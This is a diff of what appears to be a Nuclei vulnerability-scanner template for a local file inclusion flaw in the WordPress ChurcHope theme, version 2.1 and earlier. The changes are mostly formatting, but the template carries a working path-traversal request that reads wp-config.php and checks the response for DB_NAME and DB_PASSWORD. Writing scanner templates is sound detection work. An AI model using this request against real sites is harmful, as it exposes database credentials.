@@ -1,5 +1,4 @@
 id: churchope-lfi
-
 info:
   name: WordPress ChurcHope Theme <= 2.1 - Local File Inclusion
   author: dhiyaneshDK
@@ -9,13 +8,11 @@ info:
     - https://wpscan.com/vulnerability/3c5833bd-1fe0-4eba-97aa-7d3a0c8fda15
   classification:
     cwe-id: CWE-22
-  tags: wp,wpscan,wordpress,wp-theme,lfi
-
-http:
+  tags: wordpress,wp-theme,lfi,wp
+requests:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php'
-
     matchers-condition: and
     matchers:
       - type: word
@@ -24,7 +21,6 @@ http:
           - "DB_NAME"
           - "DB_PASSWORD"
         condition: and
-
       - type: status
         status:
           - 200
